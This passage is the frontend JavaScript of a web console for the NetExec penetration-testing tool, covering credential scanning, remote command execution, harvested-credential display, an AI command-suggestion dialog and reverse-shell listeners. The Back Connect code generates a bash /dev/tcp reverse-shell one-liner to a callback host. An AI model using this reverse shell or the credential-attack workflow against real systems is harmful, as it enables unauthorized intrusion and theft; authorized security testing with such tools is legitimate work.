/* NetExec Web GUI - frontend application logic (vanilla JS, no build step). */

let PROTOCOLS = {};
let EXEC_METHODS = {};
let currentJobWs = null;
let currentBcWs = null;
let currentBcSessionId = null;
let listenerRefreshTimer = null;
let currentUser = null;
let currentBackconnectRoute = null;
let lastGeneratedBackconnectCommand = "";
let listenerSourceManuallyEdited = false;
let callbackHostManuallyEdited = false;
let routeRequestSequence = 0;
let currentAiTarget = null;
let currentAiField = null;
let aiStatus = null;
let aiRequestSequence = 0;
let moduleRequestSequence = 0;

function wsUrl(path) {
  const scheme = location.protocol === "https:" ? "wss://" : "ws://";
  return scheme + location.host + path;
}

function linesToList(text) {
  return text.split("\n").map((s) => s.trim()).filter((s) => s.length > 0);
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, (char) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#039;",
  })[char]);
}

function parseModuleOptions(text) {
  return linesToList(text).map((line) => {
    const idx = line.indexOf("=");
    if (idx === -1) return { key: line, value: "" };
    return { key: line.slice(0, idx).trim(), value: line.slice(idx + 1).trim() };
  });
}

/* ---------------------------- View / tab switching ---------------------------- */

function showLogin() {
  stopListenerPolling();
  if (currentJobWs) {
    currentJobWs.close();
    currentJobWs = null;
  }
  if (currentBcWs) {
    currentBcWs.close();
    currentBcWs = null;
  }
  currentUser = null;
  document.getElementById("view-login").classList.remove("hidden");
  document.getElementById("view-app").classList.add("hidden");
}

function showApp() {
  document.getElementById("view-login").classList.add("hidden");
  document.getElementById("view-app").classList.remove("hidden");
}

window.addEventListener("nxc:unauthorized", showLogin);

function switchTab(name) {
  document.querySelectorAll(".tab-btn").forEach((b) => b.classList.toggle("active", b.dataset.tab === name));
  document.querySelectorAll(".tab-panel").forEach((p) => p.classList.toggle("active", p.id === `tab-${name}`));
  if (name === "backconnect") {
    startListenerPolling();
  } else {
    stopListenerPolling();
  }
  if (name === "users") refreshUsers().catch(() => {});
}

function startListenerPolling() {
  if (!currentUser) return;
  refreshListeners().catch(() => {});
  if (!listenerRefreshTimer) {
    listenerRefreshTimer = setInterval(() => {
      if (!currentUser) {
        stopListenerPolling();
        return;
      }
      refreshListeners().catch(() => {});
    }, 3000);
  }
}

function stopListenerPolling() {
  if (listenerRefreshTimer) {
    clearInterval(listenerRefreshTimer);
    listenerRefreshTimer = null;
  }
}

/* ---------------------------- Auth ---------------------------- */

async function tryRestoreSession() {
  try {
    const me = await API.get("/api/auth/me");
    await enterAuthenticatedSession(me);
  } catch (_) {
    showLogin();
  }
}

document.getElementById("login-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("login-username").value;
  const password = document.getElementById("login-password").value;
  const errorBox = document.getElementById("login-error");
  errorBox.textContent = "";
  try {
    const account = await API.post("/api/auth/login", { username, password });
    await enterAuthenticatedSession(account);
  } catch (err) {
    errorBox.textContent = err.message;
  }
});

document.getElementById("logout-btn").addEventListener("click", async () => {
  stopListenerPolling();
  await API.post("/api/auth/logout");
  showLogin();
});

document.querySelectorAll(".tab-btn").forEach((btn) => {
  btn.addEventListener("click", () => switchTab(btn.dataset.tab));
});

function applyCurrentUser(account) {
  currentUser = account;
  const passwordChangeRequired = Boolean(account.must_change_password);
  document.getElementById("whoami-user").textContent = `${account.username} (${account.role})`;
  document.getElementById("users-tab-btn").classList.toggle("hidden", account.role !== "admin" || passwordChangeRequired);
  document.querySelectorAll(".tab-btn").forEach((button) => {
    button.disabled = passwordChangeRequired && button.dataset.tab !== "settings";
  });
  document.getElementById("password-change-notice").textContent = passwordChangeRequired
    ? "This is a temporary credential. Set a new password before using the console."
    : "";
}

async function enterAuthenticatedSession(account) {
  applyCurrentUser(account);
  showApp();
  if (account.must_change_password) {
    const runtimeStatus = document.getElementById("runtime-status");
    runtimeStatus.textContent = "password change required";
    runtimeStatus.className = "badge pwned";
    switchTab("settings");
    return;
  }
  await bootApp();
}

/* ---------------------------- Boot ---------------------------- */

async function bootApp() {
  const health = await API.get("/api/health");
  const runtimeStatus = document.getElementById("runtime-status");
  runtimeStatus.textContent = health.nxc_available ? "nxc ready" : "nxc missing";
  runtimeStatus.className = `badge ${health.nxc_available ? "ok" : "pwned"}`;
  runtimeStatus.title = health.nxc_binary;
  const proto = await API.get("/api/protocols");
  PROTOCOLS = proto.protocols;
  EXEC_METHODS = proto.exec_methods;
  refreshAiStatus().catch(() => {});
  populateProtocolSelects();
  await refreshModulesForProtocol(document.getElementById("scan-protocol").value);
  await refreshJobs();
  await populateWorkspaces();
  await refreshHosts();
}

/* ---------------------------- AI Assistant ---------------------------- */

const AI_FIELD_NAMES = {
  execute_command: "Execute command (-x)",
  execute_powershell: "Execute PowerShell (-X)",
  module_options: "Module options",
  extra_args: "NetExec CLI arguments",
  backconnect_command: "Callback connectivity command",
};

async function refreshAiStatus() {
  aiStatus = await API.get("/api/ai/status");
  const status = document.getElementById("ai-provider-status");
  status.textContent = aiStatus.model ? `${aiStatus.provider} / ${aiStatus.model}` : aiStatus.provider;
  status.className = `badge ${aiStatus.available ? "ok" : "pwned"}`;
  status.title = aiStatus.available ? "AI provider ready" : "AI provider configuration is incomplete";
}

function setAiGenerateState(generating) {
  const button = document.getElementById("ai-generate");
  button.disabled = generating;
  button.textContent = generating ? "Generating..." : "Generate suggestions";
}

function invalidateAiSuggestions(showMessage = true) {
  aiRequestSequence += 1;
  const results = document.getElementById("ai-results");
  const hadResult = results.childElementCount > 0;
  results.replaceChildren();
  document.getElementById("ai-error").textContent = "";
  document.getElementById("ai-notice").textContent = showMessage && hadResult
    ? "Assessment goal changed. Generate new suggestions."
    : "";
  setAiGenerateState(false);
}

function openAiAssistant(button) {
  currentAiTarget = document.getElementById(button.dataset.aiTarget);
  currentAiField = button.dataset.aiField;
  if (!currentAiTarget || !currentAiField) return;

  document.getElementById("ai-field-context").textContent = AI_FIELD_NAMES[currentAiField] || currentAiField;
  document.getElementById("ai-goal").value = "";
  document.getElementById("ai-language").value = "auto";
  invalidateAiSuggestions(false);
  const dialog = document.getElementById("ai-assistant-dialog");
  dialog.showModal();
  refreshAiStatus().catch((err) => {
    document.getElementById("ai-provider-status").textContent = "unavailable";
    document.getElementById("ai-error").textContent = err.message;
  });
  document.getElementById("ai-goal").focus();
}

function substituteCallbackPlaceholders(command) {
  const callbackHost = document.getElementById("bc-callback-host").value.trim();
  const listenerPort = document.getElementById("bc-listener-port").value.trim();
  return command
    .replaceAll("<callback-host>", callbackHost || "<callback-host>")
    .replaceAll("<listener-port>", listenerPort || "<listener-port>");
}

function renderAiSuggestions(response) {
  const container = document.getElementById("ai-results");
  container.replaceChildren();
  const indonesian = response.language === "id";
  const riskLabels = indonesian
    ? { low: "rendah", medium: "sedang", high: "tinggi" }
    : { low: "low", medium: "medium", high: "high" };
  response.suggestions.forEach((suggestion) => {
    const item = document.createElement("article");
    item.className = "ai-suggestion";

    const heading = document.createElement("div");
    heading.className = "row-between";
    const title = document.createElement("strong");
    title.textContent = suggestion.title;
    const risk = document.createElement("span");
    risk.className = `risk-badge risk-${suggestion.risk}`;
    risk.textContent = riskLabels[suggestion.risk] || suggestion.risk;
    heading.append(title, risk);

    const command = document.createElement("pre");
    command.className = "ai-command";
    command.textContent = suggestion.command;
    const explanation = document.createElement("p");
    explanation.textContent = suggestion.explanation;
    const useButton = document.createElement("button");
    useButton.type = "button";
    useButton.className = "use-suggestion";
    useButton.textContent = indonesian ? "Gunakan saran" : "Use suggestion";
    useButton.addEventListener("click", () => {
      let value = suggestion.command;
      if (currentAiField === "backconnect_command") value = substituteCallbackPlaceholders(value);
      currentAiTarget.value = value;
      currentAiTarget.dispatchEvent(new Event("input", { bubbles: true }));
      document.getElementById("ai-assistant-dialog").close();
      currentAiTarget.focus();
    });

    item.append(heading, command, explanation, useButton);
    container.appendChild(item);
  });
  document.getElementById("ai-notice").textContent = response.notice;
  const statusParts = [response.provider];
  if (response.model) statusParts.push(response.model);
  statusParts.push(response.language === "id" ? "ID" : "EN");
  document.getElementById("ai-provider-status").textContent = statusParts.join(" / ");
}

document.querySelectorAll(".ai-assist-btn").forEach((button) => {
  button.addEventListener("click", () => openAiAssistant(button));
});

document.getElementById("ai-dialog-close").addEventListener("click", () => {
  document.getElementById("ai-assistant-dialog").close();
});

document.getElementById("ai-goal").addEventListener("input", () => invalidateAiSuggestions());
document.getElementById("ai-language").addEventListener("change", () => invalidateAiSuggestions());

document.getElementById("ai-generate").addEventListener("click", async () => {
  const requestSequence = ++aiRequestSequence;
  const error = document.getElementById("ai-error");
  error.textContent = "";
  document.getElementById("ai-results").replaceChildren();
  document.getElementById("ai-notice").textContent = "Generating new suggestions...";
  setAiGenerateState(true);
  try {
    const protocol = currentAiTarget?.id.startsWith("bc-")
      ? document.getElementById("bc-protocol").value
      : document.getElementById("scan-protocol").value;
    const modules = Array.from(document.getElementById("scan-modules").selectedOptions)
      .map((option) => option.value)
      .filter(Boolean);
    const response = await API.post("/api/ai/suggestions", {
      field: currentAiField,
      protocol,
      goal: document.getElementById("ai-goal").value,
      language: document.getElementById("ai-language").value,
      modules: currentAiField === "module_options" ? modules : [],
      shell_type: currentAiTarget?.id.startsWith("bc-")
        ? document.getElementById("bc-shell-type").value
        : null,
    });
    if (requestSequence !== aiRequestSequence) return;
    renderAiSuggestions(response);
  } catch (err) {
    if (requestSequence !== aiRequestSequence) return;
    document.getElementById("ai-notice").textContent = "";
    error.textContent = err.message;
  } finally {
    if (requestSequence === aiRequestSequence) setAiGenerateState(false);
  }
});

/* ---------------------------- Users tab ---------------------------- */

async function refreshUsers() {
  if (!currentUser || currentUser.role !== "admin") return;
  const users = await API.get("/api/users");
  const tbody = document.querySelector("#users-table tbody");
  const resetSelect = document.getElementById("user-reset-username");
  tbody.innerHTML = "";
  resetSelect.innerHTML = "";

  users.forEach((user) => {
    if (user.username.toLowerCase() !== currentUser.username.toLowerCase()) {
      resetSelect.appendChild(new Option(user.username, user.username));
    }
    const tr = document.createElement("tr");

    const usernameCell = document.createElement("td");
    usernameCell.textContent = user.username;

    const roleCell = document.createElement("td");
    const roleSelect = document.createElement("select");
    roleSelect.className = "table-control";
    roleSelect.appendChild(new Option("Administrator", "admin"));
    roleSelect.appendChild(new Option("Operator", "operator"));
    roleSelect.value = user.role;
    roleSelect.disabled = user.username.toLowerCase() === currentUser.username.toLowerCase();
    roleCell.appendChild(roleSelect);

    const enabledCell = document.createElement("td");
    const enabledToggle = document.createElement("input");
    enabledToggle.type = "checkbox";
    enabledToggle.checked = user.enabled;
    enabledToggle.disabled = user.username.toLowerCase() === currentUser.username.toLowerCase();
    enabledCell.appendChild(enabledToggle);

    const passwordCell = document.createElement("td");
    passwordCell.textContent = user.must_change_password ? "Change required" : "Current";

    const createdCell = document.createElement("td");
    createdCell.textContent = user.created_at ? new Date(user.created_at * 1000).toLocaleString() : "";

    const actionsCell = document.createElement("td");
    actionsCell.className = "action-cell";
    const saveButton = document.createElement("button");
    saveButton.textContent = "Save";
    saveButton.disabled = user.username.toLowerCase() === currentUser.username.toLowerCase();
    saveButton.addEventListener("click", async () => {
      await runUserAction(
        () => API.patch(`/api/users/${encodeURIComponent(user.username)}`, {
          role: roleSelect.value,
          enabled: enabledToggle.checked,
        }),
        "Account updated.",
      );
    });
    const deleteButton = document.createElement("button");
    deleteButton.className = "danger";
    deleteButton.textContent = "Delete";
    deleteButton.disabled = user.username.toLowerCase() === currentUser.username.toLowerCase();
    deleteButton.addEventListener("click", async () => {
      if (!window.confirm(`Delete account ${user.username}?`)) return;
      await runUserAction(() => API.del(`/api/users/${encodeURIComponent(user.username)}`), "Account deleted.");
    });
    actionsCell.append(saveButton, deleteButton);

    tr.append(usernameCell, roleCell, enabledCell, passwordCell, createdCell, actionsCell);
    tbody.appendChild(tr);
  });
}

async function runUserAction(action, successMessage) {
  const result = document.getElementById("users-result");
  result.textContent = "";
  try {
    await action();
    result.textContent = successMessage;
    await refreshUsers();
  } catch (err) {
    result.textContent = `Error: ${err.message}`;
  }
}

document.getElementById("users-refresh").addEventListener("click", refreshUsers);

document.getElementById("user-create-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const result = document.getElementById("user-create-result");
  result.textContent = "";
  try {
    await API.post("/api/users", {
      username: document.getElementById("user-create-username").value,
      password: document.getElementById("user-create-password").value,
      role: document.getElementById("user-create-role").value,
    });
    result.textContent = "Account created. The user must change the initial password after login.";
    e.target.reset();
    await refreshUsers();
  } catch (err) {
    result.textContent = `Error: ${err.message}`;
  }
});

document.getElementById("user-reset-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("user-reset-username").value;
  const result = document.getElementById("user-reset-result");
  result.textContent = "";
  try {
    await API.post(`/api/users/${encodeURIComponent(username)}/reset-password`, {
      new_password: document.getElementById("user-reset-password").value,
    });
    result.textContent = "Password reset complete. The user must change it after login.";
    document.getElementById("user-reset-password").value = "";
  } catch (err) {
    result.textContent = `Error: ${err.message}`;
  }
});

function populateProtocolSelects() {
  const scanSel = document.getElementById("scan-protocol");
  const hostsSel = document.getElementById("hosts-protocol");
  const bcSel = document.getElementById("bc-protocol");
  [scanSel, hostsSel, bcSel].forEach((sel) => (sel.innerHTML = ""));
  Object.entries(PROTOCOLS).forEach(([key, meta]) => {
    scanSel.appendChild(new Option(meta.label, key));
    hostsSel.appendChild(new Option(meta.label, key));
    bcSel.appendChild(new Option(meta.label, key));
  });
  updateExecMethodSelect(scanSel.value);
  updateScanProtocolControls(scanSel.value);
  updateBackconnectControls(bcSel.value);
}

function updateExecMethodSelect(protocol) {
  const sel = document.getElementById("scan-exec-method");
  sel.innerHTML = '<option value="">(default)</option>';
  (EXEC_METHODS[protocol] || []).forEach((m) => sel.appendChild(new Option(m, m)));
  sel.disabled = !(EXEC_METHODS[protocol] || []).length;
}

function updateScanProtocolControls(protocol) {
  const capabilities = PROTOCOLS[protocol] || {};
  const kerberos = document.getElementById("scan-kerberos");
  const localAuth = document.getElementById("scan-local-auth");
  const executeCommand = document.getElementById("scan-exec-cmd");
  const executePowerShell = document.getElementById("scan-exec-psh");
  const executeCommandAi = document.getElementById("scan-exec-cmd-ai");
  const executePowerShellAi = document.getElementById("scan-exec-psh-ai");
  const noOutput = document.getElementById("scan-no-output");

  kerberos.disabled = capabilities.supports_kerberos === false;
  localAuth.disabled = capabilities.supports_local_auth === false;
  executeCommand.disabled = capabilities.supports_exec === false;
  executePowerShell.disabled = capabilities.supports_exec === false || capabilities.supports_powershell === false;
  executeCommandAi.disabled = executeCommand.disabled;
  executePowerShellAi.disabled = executePowerShell.disabled;
  noOutput.disabled = capabilities.supports_exec === false;

  if (kerberos.disabled) kerberos.checked = false;
  if (localAuth.disabled) localAuth.checked = false;
  if (executeCommand.disabled) executeCommand.value = "";
  if (executePowerShell.disabled) executePowerShell.value = "";
  if (noOutput.disabled) noOutput.checked = false;
}

function setModuleCatalogState(message, disabled = true) {
  const select = document.getElementById("scan-modules");
  select.replaceChildren();
  const option = new Option(message, "");
  option.disabled = true;
  select.appendChild(option);
  select.disabled = disabled;
  select.dataset.protocol = "";
  document.getElementById("scan-modules-status").textContent = message;
  document.getElementById("scan-module-options").value = "";
  document.getElementById("scan-module-options").disabled = true;
  document.querySelector('[data-ai-target="scan-module-options"]').disabled = true;
}

function updateModuleSelectionState() {
  const select = document.getElementById("scan-modules");
  const availableCount = Array.from(select.options).filter((option) => option.value).length;
  const selectedCount = Array.from(select.selectedOptions).filter((option) => option.value).length;
  const hasSelection = selectedCount > 0;
  const moduleOptions = document.getElementById("scan-module-options");

  document.getElementById("scan-modules-status").textContent = hasSelection
    ? `${selectedCount} of ${availableCount} module(s) selected`
    : `${availableCount} module(s) available; none selected`;
  moduleOptions.disabled = !hasSelection;
  document.querySelector('[data-ai-target="scan-module-options"]').disabled = !hasSelection;
  if (!hasSelection) moduleOptions.value = "";
}

document.getElementById("scan-protocol").addEventListener("change", async (e) => {
  const protocol = e.target.value;
  updateExecMethodSelect(protocol);
  updateScanProtocolControls(protocol);
  buildScanCommandPreview();
  await refreshModulesForProtocol(protocol);
});

async function refreshModulesForProtocol(protocol) {
  const requestSequence = ++moduleRequestSequence;
  const sel = document.getElementById("scan-modules");
  setModuleCatalogState("Loading module catalog...");
  if (!PROTOCOLS[protocol] || !PROTOCOLS[protocol].supports_modules) {
    setModuleCatalogState(`Modules are not supported for ${protocol.toUpperCase()}`);
    return;
  }
  try {
    const data = await API.get(`/api/modules?protocol=${encodeURIComponent(protocol)}`);
    if (requestSequence !== moduleRequestSequence || document.getElementById("scan-protocol").value !== protocol) {
      return;
    }
    if (!data.available) {
      setModuleCatalogState(data.detail || "Module catalog is unavailable");
      return;
    }
    sel.replaceChildren();
    data.modules.forEach((m) => {
      const label = `${m.name}${m.requires_admin ? " [admin]" : ""} - ${m.description}`;
      sel.appendChild(new Option(label, m.name));
    });
    if (!data.modules.length) {
      setModuleCatalogState(`No modules are available for ${protocol.toUpperCase()}`);
      return;
    }
    sel.disabled = false;
    sel.dataset.protocol = protocol;
    updateModuleSelectionState();
  } catch (err) {
    if (requestSequence === moduleRequestSequence && document.getElementById("scan-protocol").value === protocol) {
      setModuleCatalogState(`Failed to list modules: ${err.message}`);
    }
  }
}

document.getElementById("scan-modules").addEventListener("change", updateModuleSelectionState);

/* ---------------------------- Scan tab ---------------------------- */

function buildScanCommandPreview() {
  const parts = ["nxc", document.getElementById("scan-protocol").value];
  linesToList(document.getElementById("scan-targets").value).forEach((t) => parts.push(t));
  document.getElementById("scan-command-preview").textContent = parts.join(" ") + " ...";
}

["scan-protocol", "scan-targets"].forEach((id) =>
  document.getElementById(id).addEventListener("input", buildScanCommandPreview)
);

document.getElementById("scan-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const errorBox = document.getElementById("scan-error");
  errorBox.textContent = "";

  const modulesSel = document.getElementById("scan-modules");
  const selectedModules = Array.from(modulesSel.selectedOptions).map((o) => o.value).filter(Boolean);
  const selectedProtocol = document.getElementById("scan-protocol").value;
  if (selectedModules.length && modulesSel.dataset.protocol !== selectedProtocol) {
    errorBox.textContent = "The module catalog changed. Select modules again for the active protocol.";
    return;
  }

  const payload = {
    protocol: selectedProtocol,
    targets: linesToList(document.getElementById("scan-targets").value),
    username: linesToList(document.getElementById("scan-username").value),
    password: linesToList(document.getElementById("scan-password").value),
    hashes: linesToList(document.getElementById("scan-hashes").value),
    domain: document.getElementById("scan-domain").value || null,
    kerberos: document.getElementById("scan-kerberos").checked,
    local_auth: document.getElementById("scan-local-auth").checked,
    execute_command: document.getElementById("scan-exec-cmd").value || null,
    execute_powershell: document.getElementById("scan-exec-psh").value || null,
    exec_method: document.getElementById("scan-exec-method").value || null,
    no_output: document.getElementById("scan-no-output").checked,
    modules: selectedModules,
    module_options: parseModuleOptions(document.getElementById("scan-module-options").value),
    extra_args: document.getElementById("scan-extra-args").value,
    workspace: document.getElementById("scan-workspace").value || null,
  };

  try {
    const job = await API.post("/api/jobs", payload);
    switchTab("jobs");
    await refreshJobs();
    openJobConsole(job.id);
  } catch (err) {
    errorBox.textContent = err.message;
  }
});

/* ---------------------------- Jobs tab ---------------------------- */

function statusBadge(status) {
  return `<span class="badge ${status === "running" || status === "completed" ? "ok" : "pwned"}">${escapeHtml(status)}</span>`;
}

async function refreshJobs() {
  const jobs = await API.get("/api/jobs");
  const tbody = document.querySelector("#jobs-table tbody");
  tbody.innerHTML = "";
  jobs.forEach((job) => {
    const tr = document.createElement("tr");
    tr.className = "clickable";
    const started = new Date(job.started_at * 1000).toLocaleTimeString();
    tr.innerHTML = `<td>${escapeHtml(job.protocol)}</td><td>${statusBadge(job.status)}</td>` +
      `<td>${job.pwned_hosts.length ? `<span class="badge pwned">${escapeHtml(job.pwned_hosts.join(", "))}</span>` : ""}</td>` +
      `<td>${escapeHtml(started)}</td>`;
    tr.addEventListener("click", () => openJobConsole(job.id));
    tbody.appendChild(tr);
  });
}

document.getElementById("jobs-refresh").addEventListener("click", refreshJobs);

function appendConsoleLine(el, line) {
  el.textContent += (el.textContent ? "\n" : "") + line;
  if (el.textContent.length > 2_000_000) el.textContent = el.textContent.slice(-2_000_000);
  el.scrollTop = el.scrollHeight;
}

async function openJobConsole(jobId) {
  if (currentJobWs) {
    currentJobWs.close();
    currentJobWs = null;
  }
  const detail = await API.get(`/api/jobs/${jobId}`);
  document.getElementById("console-title").textContent = `Console - ${detail.command_preview}`;
  const out = document.getElementById("console-output");
  out.textContent = detail.log_tail.join("\n");
  out.scrollTop = out.scrollHeight;

  const stopBtn = document.getElementById("job-stop-btn");
  stopBtn.classList.toggle("hidden", detail.status !== "running");
  stopBtn.onclick = async () => {
    await API.post(`/api/jobs/${jobId}/stop`);
  };

  const ws = new WebSocket(wsUrl(`/ws/jobs/${jobId}`));
  currentJobWs = ws;
  ws.onmessage = (evt) => {
    const msg = JSON.parse(evt.data);
    if (msg.type === "log") {
      appendConsoleLine(out, msg.line);
    } else if (msg.type === "end") {
      stopBtn.classList.add("hidden");
      refreshJobs();
    }
  };
}

/* ---------------------------- Hosts tab ---------------------------- */

async function populateWorkspaces() {
  const data = await API.get("/api/workspaces");
  const selectors = [document.getElementById("scan-workspace"), document.getElementById("hosts-workspace"), document.getElementById("bc-workspace")];
  selectors.forEach((sel) => {
    sel.innerHTML = "";
    data.workspaces.forEach((w) => sel.appendChild(new Option(w, w)));
    sel.value = data.active;
  });
}

async function refreshHosts() {
  const protocol = document.getElementById("hosts-protocol").value;
  const workspace = document.getElementById("hosts-workspace").value || "default";
  const accessibleOnly = document.getElementById("hosts-accessible-only").checked;
  if (!protocol) return;
  const path = accessibleOnly
    ? `/api/hosts/backconnect?protocol=${protocol}&workspace=${encodeURIComponent(workspace)}`
    : `/api/hosts?protocol=${protocol}&workspace=${encodeURIComponent(workspace)}`;
  const data = await API.get(path);
  const tbody = document.querySelector("#hosts-table tbody");
  tbody.innerHTML = "";
  data.hosts.forEach((h, index) => {
    const creds = (h.credentials || [])
      .map((c) => `${c.domain ? c.domain + "\\" : ""}${c.username}${c.password ? ":" + c.password : ""} (${c.credtype})`)
      .map(escapeHtml)
      .join("<br/>");
    const canBackconnect = h.pwned || (protocol === "ssh" && h.shell_access);
    const accessBadge = h.pwned
      ? '<span class="badge pwned">Pwn3d!</span>'
      : h.shell_access
        ? '<span class="badge ok">Shell access</span>'
        : '<span class="badge ok">seen</span>';
    const tr = document.createElement("tr");
    tr.innerHTML = `<td>${escapeHtml(h.host)}</td><td>${escapeHtml(h.hostname)}</td><td>${escapeHtml(h.domain)}</td>` +
      `<td>${escapeHtml(h.os)}</td><td>${accessBadge}</td>` +
      `<td>${creds}</td>` +
      `<td>${canBackconnect ? `<button class="link-btn use-target" data-index="${index}">Use in Back Connect</button>` : ""}</td>`;
    tbody.appendChild(tr);
  });
  tbody.querySelectorAll(".use-target").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const host = data.hosts[Number(btn.dataset.index)];
      const credential = (host.credentials || []).find((item) => item.password) || (host.credentials || [])[0];
      document.getElementById("bc-target").value = host.host;
      document.getElementById("bc-protocol").value = protocol;
      document.getElementById("bc-workspace").value = workspace;
      document.getElementById("bc-username").value = credential?.username || "";
      document.getElementById("bc-password").value = credential?.password || "";
      document.getElementById("bc-domain").value = credential?.domain || "";
      updateBackconnectControls(protocol);
      switchTab("backconnect");
      await refreshBackconnectRoute(true).catch((err) => {
        document.getElementById("bc-trigger-result").textContent = `Error: ${err.message}`;
      });
    });
  });
}

document.getElementById("hosts-refresh").addEventListener("click", refreshHosts);
document.getElementById("hosts-protocol").addEventListener("change", refreshHosts);
document.getElementById("hosts-workspace").addEventListener("change", refreshHosts);
document.getElementById("hosts-accessible-only").addEventListener("change", refreshHosts);

/* ---------------------------- Back Connect tab ---------------------------- */

function updateBackconnectControls(protocol) {
  const shellType = document.getElementById("bc-shell-type");
  const kerberos = document.getElementById("bc-kerberos");
  const localAuth = document.getElementById("bc-local-auth");
  shellType.innerHTML = "";
  if (protocol === "ssh") {
    shellType.appendChild(new Option("Shell command (-x)", "cmd"));
    kerberos.checked = false;
    kerberos.disabled = true;
    localAuth.checked = false;
    localAuth.disabled = true;
  } else {
    shellType.appendChild(new Option("PowerShell (-X)", "powershell"));
    shellType.appendChild(new Option("Command (-x)", "cmd"));
    kerberos.disabled = false;
    localAuth.disabled = false;
  }

  const execMethod = document.getElementById("bc-exec-method");
  execMethod.innerHTML = '<option value="">(default)</option>';
  (EXEC_METHODS[protocol] || []).forEach((method) => execMethod.appendChild(new Option(method, method)));
  execMethod.disabled = !(EXEC_METHODS[protocol] || []).length;
  updateGeneratedBackconnectCommand();
}

function updateGeneratedBackconnectCommand() {
  const command = document.getElementById("bc-command");
  const callbackHost = document.getElementById("bc-callback-host").value.trim();
  const port = parseInt(document.getElementById("bc-listener-port").value, 10);
  const protocol = document.getElementById("bc-protocol").value;
  if (protocol !== "ssh" || !callbackHost || !Number.isInteger(port)) return;

  const generated = `bash -c 'bash -i >& /dev/tcp/${callbackHost}/${port} 0>&1'`;
  if (!command.value.trim() || command.value === lastGeneratedBackconnectCommand) {
    command.value = generated;
    lastGeneratedBackconnectCommand = generated;
  }
}

async function refreshBackconnectRoute(forceSource = false) {
  const target = document.getElementById("bc-target").value.trim();
  const callbackHost = document.getElementById("bc-callback-host");
  const routeWarning = document.getElementById("bc-route-warning");
  if (!target) {
    currentBackconnectRoute = null;
    if (!callbackHostManuallyEdited) callbackHost.value = "";
    routeWarning.textContent = "";
    return null;
  }

  const requestSequence = ++routeRequestSequence;
  const route = await API.get(`/api/backconnect/route?target=${encodeURIComponent(target)}`);
  if (requestSequence !== routeRequestSequence) return currentBackconnectRoute;

  currentBackconnectRoute = route;
  if (!callbackHostManuallyEdited) callbackHost.value = route.callback_host;
  if (forceSource || !listenerSourceManuallyEdited) {
    document.getElementById("bc-listener-source").value = route.allowed_source;
    listenerSourceManuallyEdited = false;
  }
  routeWarning.textContent = route.warning || "";
  updateGeneratedBackconnectCommand();
  return route;
}

async function ensureBackconnectListener() {
  const port = parseInt(document.getElementById("bc-listener-port").value, 10);
  const allowedSource = document.getElementById("bc-listener-source").value.trim();
  if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error("Listener port must be between 1 and 65535");
  if (!allowedSource) throw new Error("Allowed source is required");

  const data = await API.get("/api/backconnect/listeners");
  const listener = data.listeners.find((item) => item.port === port);
  if (listener && listener.allowed_source === allowedSource) return listener;
  if (listener && listener.sessions.some((session) => !session.closed)) {
    throw new Error(`Port ${port} has a live session and cannot be reconfigured`);
  }
  if (listener) await API.del(`/api/backconnect/listeners/${listener.id}`);

  const created = await API.post("/api/backconnect/listeners", {
    port,
    allowed_source: allowedSource,
    label: document.getElementById("bc-listener-label").value || null,
  });
  await refreshListeners();
  return created;
}

document.getElementById("bc-protocol").addEventListener("change", (event) => {
  updateBackconnectControls(event.target.value);
  refreshBackconnectRoute(true).catch(() => {});
});
document.getElementById("bc-target").addEventListener("change", () => {
  refreshBackconnectRoute(true).catch((err) => {
    document.getElementById("bc-trigger-result").textContent = `Error: ${err.message}`;
  });
});
document.getElementById("bc-listener-port").addEventListener("input", updateGeneratedBackconnectCommand);
document.getElementById("bc-callback-host").addEventListener("input", (event) => {
  callbackHostManuallyEdited = Boolean(event.target.value.trim());
  updateGeneratedBackconnectCommand();
});
document.getElementById("bc-listener-source").addEventListener("input", () => {
  listenerSourceManuallyEdited = true;
});

document.getElementById("bc-start-listener").addEventListener("click", async () => {
  const errBox = document.getElementById("bc-listener-error");
  errBox.textContent = "";
  try {
    if (!document.getElementById("bc-listener-source").value.trim()) {
      await refreshBackconnectRoute(true);
    }
    await ensureBackconnectListener();
  } catch (err) {
    errBox.textContent = err.message;
  }
});

async function refreshListeners() {
  const data = await API.get("/api/backconnect/listeners");
  const container = document.getElementById("bc-listeners-list");
  container.innerHTML = "";
  data.listeners.forEach((listener) => {
    const box = document.createElement("div");
    box.className = "listener-item";
    const sessionsHtml = listener.sessions.length
      ? listener.sessions.map((s) =>
          `<div><button class="link-btn open-session" data-id="${escapeHtml(s.id)}">${escapeHtml(s.peer)}</button> ${s.closed ? '<span class="badge pwned">closed</span>' : '<span class="badge ok">live</span>'}</div>`
        ).join("")
      : '<div class="muted">Waiting for connection...</div>';
    const lastRejected = listener.rejected_connections?.at(-1);
    const rejectedHtml = lastRejected
      ? `<div class="error">Last rejected callback: ${escapeHtml(lastRejected.peer)} (${escapeHtml(lastRejected.reason)})</div>`
      : "";
    box.innerHTML = `<div class="row-between"><strong>${escapeHtml(listener.label)} (:${escapeHtml(listener.port)}, ${escapeHtml(listener.allowed_source)})</strong>` +
      `<button class="danger stop-listener" data-id="${escapeHtml(listener.id)}">Stop</button></div>${sessionsHtml}${rejectedHtml}`;
    container.appendChild(box);
  });
  container.querySelectorAll(".stop-listener").forEach((btn) =>
    btn.addEventListener("click", async () => {
      await API.del(`/api/backconnect/listeners/${btn.dataset.id}`);
      await refreshListeners();
    })
  );
  container.querySelectorAll(".open-session").forEach((btn) =>
    btn.addEventListener("click", () => openBcSession(btn.dataset.id))
  );
}

function openBcSession(sessionId) {
  if (currentBcWs) {
    currentBcWs.close();
    currentBcWs = null;
  }
  currentBcSessionId = sessionId;
  const out = document.getElementById("bc-console-output");
  out.textContent = `[connected to session ${sessionId}]`;
  const input = document.getElementById("bc-console-input");
  const closeBtn = document.getElementById("bc-console-close");
  input.disabled = false;
  closeBtn.disabled = false;

  const ws = new WebSocket(wsUrl(`/ws/backconnect/${sessionId}`));
  currentBcWs = ws;
  ws.onmessage = (evt) => {
    const msg = JSON.parse(evt.data);
    if (msg.type === "data") {
      out.textContent += msg.data;
